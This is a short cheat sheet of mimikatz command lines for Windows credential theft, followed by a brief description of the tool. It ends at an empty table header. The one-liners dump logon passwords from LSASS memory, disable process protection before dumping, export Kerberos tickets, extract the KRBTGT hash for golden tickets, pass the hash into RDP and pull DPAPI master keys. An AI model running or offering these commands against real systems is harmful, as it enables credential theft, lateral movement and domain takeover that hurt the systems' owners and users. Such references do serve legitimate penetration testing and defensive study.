Examples

One-liner dump all logon passwords

mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

Load mimikatz in memory via PowerShell

Invoke-Mimikatz -DumpCreds

Disable PPL (Protected Process Light) before dumping

mimikatz "!+" "privilege::debug" "sekurlsa::logonpasswords" exit

Extract credentials from a LSASS dump file

mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

Extract credentials from volume shadow copy

mimikatz "lsadump::sam /server:$(hostname)" exit

Extract Kerberos tickets

mimikatz "privilege::debug" "sekurlsa::tickets /export" exit

Extract domain SID and KRBTGT hash for golden ticket

mimikatz "privilege::debug" "lsadump::lsa /inject /id:502" exit

Pass-the-hash to RDP session

mimikatz "privilege::debug" "sekurlsa::pth /user:admin /domain:evilcorp /ntlm:<HASH> /run:mstsc.exe /restrictedadmin"

DPAPI master key extraction

mimikatz "privilege::debug" "sekurlsa::dpapi" exit

Documentation

mimikatz — Windows Credential Extraction

mimikatz is the standard tool for extracting credentials from Windows systems. It operates by reading LSASS process memory, SAM/SECURITY registry hives, and DPAPI master keys.

Common Commands

Command Purpose
